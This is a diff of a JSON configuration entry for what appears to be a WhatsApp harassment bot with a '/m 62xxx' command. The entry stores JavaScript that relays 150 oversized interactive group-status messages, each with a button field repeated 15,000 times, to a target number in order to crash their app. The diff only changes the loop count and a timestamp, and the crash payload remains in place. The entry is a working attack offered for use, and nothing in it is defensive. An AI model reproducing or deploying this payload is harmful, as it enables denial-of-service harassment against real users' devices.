@@ -12,11 +12,11 @@
   "m": {
     "code": "async function m(sock, target) {\n    for (let i = 0; i < 150; i++) {\n        const msg = {\n            groupStatusMessageV2: {\n                message: {\n                    interactiveMessage: {\n                        body: {\n                            text: \"\\u927D\"\n                        },\n                        header: {\n                            title: \"\\u200B\"\n                        },\n                        nativeFlowMessage: {\n                            buttons: \"one_crash_message\".repeat(15000)\n                        }\n                    }\n                }\n            }\n        };\n\n        await sock.relayMessage(target, msg, {\n            noSelfSync: true\n        });\n    }\n}",
     "menu": "LXW BUG FITUR",
-    "loop": 200,
+    "loop": 10,
     "sleep": 1500,
     "display": "m",
     "command": "/m 62xxx",
-    "addedAt": "2026-09-25T13:00:09.791Z",
+    "addedAt": "2026-09-25T14:27:13.565Z",
     "addedBy": "8729323584"
   }
 }
